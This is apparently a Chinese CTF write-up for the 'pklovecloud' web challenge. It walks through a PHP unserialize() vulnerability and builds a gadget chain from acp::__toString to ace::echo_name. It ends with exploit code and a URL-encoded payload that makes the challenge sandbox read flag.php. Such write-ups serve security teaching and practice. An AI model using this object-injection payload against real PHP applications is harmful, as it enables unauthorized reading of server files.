::: info
2021-第五届空间智能安全大赛-Web-pklovecloud
:::

## 1、思路

（1）代码分析

```php
<?php  
include 'flag.php';
class pkshow 
{  
    function echo_name()     
    {          
        return "Pk very safe^.^";      
    }  
} 

class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new pkshow;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    }  
}  

class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}  

if (isset($_GET['pks']))  
{
    $logData = unserialize($_GET['pks']);
    echo $logData; 
} 
else 
{ 
    highlight_file(__file__); 
}
?>
```

- `include 'flag.php';` 可能包含敏感信息
- `$_GET['pks']` 用于获取 GET 请求参数中名为 pkg 的值
- `isset($_GET['pks']` 用于检查 $_GET['pks'] 是否被设置，可以通过在 URL 中添加查询参数来设置
- `unserialize()` 反序列化，<font color=red>是不安全的，因为它可能会导致代码注入和安全漏洞</font>，因此在反序列化之前，应该对用户提供的数据进行严格的验证和过滤
- `highlight_file(__file__); ` highlight_file 用于在网页上将指定文件的源代码以语法高亮的形式展示，\__file__ 代表当前文件的路径，因此 highlight_file() 函数将读取该文件的内容并对其进行语法高亮处理后输出到网页上
- `class pkshow`
  - echo_name() 输出 "Pk very safe\^.^"

- `class acp `
  - `__construct()` 在 new 创建类的新实例时自动调用，赋值成员变量 cinder
  - `__toString()` 对一个对象进行 echo 操作或者 print 操作会触发__toString，如果成员变量 cinder 已被设置，转换为字符串返回
  - 成员变量 neutron 和 nova 未设置

- `class ace`
  - 成员变量 docker、filename 未设置
  - 成员变量 openstack 赋值为 `unserialize($this->docker)`
  - `openstack->neutron` 赋值为 `$heat`
  - `$this->openstack->neutron === $this->openstack->nova`
    - `file_get_contents($file)` 读取文件内容并返回字符串


（2）反推

- pks 注入，赋值变量并输出
- file_get_contents($file) 获取 flag
  - 调用类 ace 的函数 echo_name()
  - 类 acp 中魔术方法 __toString() 存在函数 echo_name() 的调用
  - 调用类 acp 中的魔术方法 __toString()，进行 echo 操作或者 print 操作即可
  - __toString() 需要成员变量 cinder 已被设置
  - 创建类 acp 时自动调用 \_\_construct() 赋值成员变量 cinder

（3）正推

- pks 传入序列化的 new acp，反序列化后执行 echo
- acp 自动调用 \_\_construct() 赋值成员变量 cinder
- echo 触发 __toString()
  - 如果 `$this->cinder = new pkshow;`  就会调用类 pkshow 的 echo_name() 
  - 赋值 ace 就会调用类 ace 的 echo_name() 

## 2、反序列化

### 序列化

```
serialize($a)
```

### url 编码

```php
urlencode(serialize($a))
```

### Pk very safe\^.^

```php
<?php
class pkshow
{
    function echo_name()
    {
        return "Pk very safe^.^";
    }
}

class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new pkshow;
    }
} 

$a = new acp();

echo urlencode(serialize($a));
?>
```

### keystone lost~

$this->cinder 赋值 ace 调用类 ace 的 echo_name() 

```php
<?php
class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new ace;
    }
} 

class ace
{    
    public $filename;     
    public $openstack;
    public $docker;
}  

$a = new acp();

echo urlencode(serialize($a));
?>
```

### flag.php

`file_get_contents($file)` 读取到了文件类型

`$file = "./{$this->filename}";`  赋值 filename 为 flag.php

```php
<?php
class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new ace;
    }
} 

class ace
{    
    public $filename = "flag.php";     
    public $openstack;
    public $docker;
}  

$a = new acp();

echo urlencode(serialize($a));
?>
```

## 3、exp

```php
<?php
class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new ace;
    }
} 

class ace
{    
    public $filename = "flag.php";     
    public $openstack;
    public $docker;
}  

$a = new acp();

echo urlencode(serialize($a));
?>
```

得到参数 pks 的值 O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D%

访问 http://challenge-ffb04f26eb458f7b.sandbox.ctfhub.com:10800?pks=O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D% 查看源代码得到 flag